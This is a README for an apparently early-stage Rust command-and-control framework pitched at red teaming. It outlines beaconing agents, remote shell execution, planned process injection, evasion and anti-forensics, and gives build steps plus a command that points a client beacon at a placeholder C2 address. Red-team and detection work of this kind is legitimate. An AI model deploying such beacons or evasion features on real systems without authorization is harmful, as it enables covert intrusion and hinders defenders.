# OblivionC2 - Command & Control Framework

## Overview

A C2 in Rust, designed for authorized red team exercises, penetration testing, and security research in controlled environments.

---

## Project Intent

- **Authorized Red Team Operations**: Conduct realistic adversary simulations in approved environments
- **Security Research**: Study adversary techniques and defensive countermeasures
- **Operator Training**: Learn C2 operations and post-exploitation techniques in controlled labs
- **Infrastructure Testing**: Validate detection and response capabilities of security controls
- **Post-Engagement Analysis**: Comprehensive logging for security improvement recommendations

---

## Technology Stack

### Core
- **Language**: Rust (server & cross-platform client)
- **Runtime**: Tokio (async execution)
- **Communication**: gRPC/TLS (encrypted C2 channels)
- **Database**: SQLite/PostgreSQL (operational logging)

---

## Architecture

### Server Component
- Multi-threaded listener accepting encrypted agent beacons
- Session management and agent tracking
- Command queue system for operator tasking
- Comprehensive audit logging
- REST API for operator interaction
- Optional web dashboard for visualization

### Client Component (Multi-Platform)
- Lightweight beacon with configurable callback intervals
- OS-agnostic command execution (shell, PowerShell, bash)
- Encrypted command/response channel
- Modular capability loading
- Process execution primitives (approved testing)
- Anti-forensics awareness features

---

## Project Phases

| Phase | Scope | Status |
|-------|-------|--------|
| Phase 1 | Core server, basic client, simple commands | started |
| Phase 2 | Encryption, auth, multi-agent management | pending |
| Phase 3 | Advanced capabilities, process injection | Pending |
| Phase 4 | Web UI, reporting, operator tools | Pending|
| Phase 5 | Detection testing, evasion features | Pending |

---

## Requirements

### Server
- Linux (Ubuntu 20.04+, RHEL 8+, or compatible)
- Rust 1.70+
- SQLite3 or PostgreSQL
- Network accessibility for agent callbacks

### Client
- Rust 1.70+
- Linux, Windows, macOS support (platform-specific build)
- Network access to C2 server

---

## Usage

### Building

```bash
# Clone repository
git clone https://github.com/yourorg/tyC2.git
cd tyC2

# Build server
cargo build --release -p tyc2-server

# Build client (platform-specific)
cargo build --release -p tyc2-client --target x86_64-unknown-linux-gnu
```

### Deployment

```bash
# Run server
./target/release/tyc2-server --config config.yaml

# Deploy client (in authorized environment)
./target/release/tyc2-client --server <C2_SERVER_IP> --interval 30s
```

## Contributing

This is a personal project. For contributions, please wait till I get most things right.

---

## Disclaimer

This is provided as-is for authorized security testing. The authors assume no liability for misuse, unauthorized access, or system damage. **Users are solely responsible for ensuring all operations are authorized, legal, and ethical.**

---
